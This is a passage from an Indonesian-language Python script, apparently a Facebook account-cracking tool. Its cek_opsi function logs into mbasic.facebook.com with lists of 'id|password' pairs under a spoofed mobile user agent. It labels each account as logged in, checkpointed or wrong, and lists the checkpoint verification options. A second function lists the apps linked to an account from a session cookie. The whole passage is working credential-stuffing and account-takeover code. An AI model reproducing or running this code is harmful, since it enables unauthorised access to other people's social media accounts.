#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# 𝐊𝐎𝐍𝐄𝐊𝐒𝐈 𝐈𝐍𝐓𝐄𝐑𝐍𝐄𝐓 𝐁𝐄𝐑𝐌𝐀𝐒𝐀𝐋𝐀𝐇, 𝐏𝐄𝐑𝐈𝐊𝐒𝐀 & 𝐂𝐎𝐁𝐀 𝐋𝐀𝐆𝐈'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/download')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	alvino_xy(f'\n\t{x}——> {h}𝒔𝒆𝒎𝒐𝒈𝒂 𝒉𝒂𝒓𝒊𝒎𝒖 𝒎𝒆𝒏𝒚𝒆𝒏𝒂𝒏𝒈𝒌𝒂𝒏 - 𝒅𝒊𝒈𝒊𝒕𝒂𝒍 𝒂𝒍𝒍𝒊𝒂𝒏𝒄𝒆 𝒕𝒐𝒐𝒍𝒔 ! {x}')
	time.sleep(3)
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> DIGITAL ALLIANCE <<<<<#
